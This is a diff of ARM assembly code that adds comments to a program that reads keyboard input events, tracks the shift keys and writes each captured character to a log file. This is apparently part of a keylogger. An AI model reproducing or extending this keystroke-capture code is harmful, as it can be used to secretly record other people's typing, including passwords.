@@ -52,14 +52,15 @@ checkShiftRelease:
         ldr   r0, =input_event
         ldrh  r0, [r0, #10]
 
-        cmp   r0, #42
+        cmp   r0, #42                    // left shift key
         beq   releaseShift
 
-        cmp   r0, #54
+        cmp   r0, #54                    // right shift key
         beq   releaseShift
         b     loop
 
 releaseShift:
+        // reset shift flag to 0
         ldr   r9, =shift
         mov   r8, #0
         strb  r8, [r9]
@@ -109,10 +110,10 @@ write:
         strb  r0, [r9]
 
         // write character to destination file
-        mov   r7, #4
-        mov   r0, r11
+        mov   r7, #4                     // write syscall
+        mov   r0, r11                    // log file descriptor
         ldr   r1, =character
-        mov   r2, #1
+        mov   r2, #1                     // number of bytes to write
         svc   #0
 
         // get next character
@@ -120,13 +121,13 @@ write:
 
 _end:
         // for clean exit
-        mov   r7, #1
+        mov   r7, #1                     // exit syscall
         svc   #0
 
 error:
         // print error message to stdout
-        mov   r7, #4
-        mov   r0, #2
+        mov   r7, #4                     // write syscall
+        mov   r0, #2                     // STDERR_FILENO
         ldr   r1, =errMsg
         ldr   r2, =lenErrMsg
         svc   #0
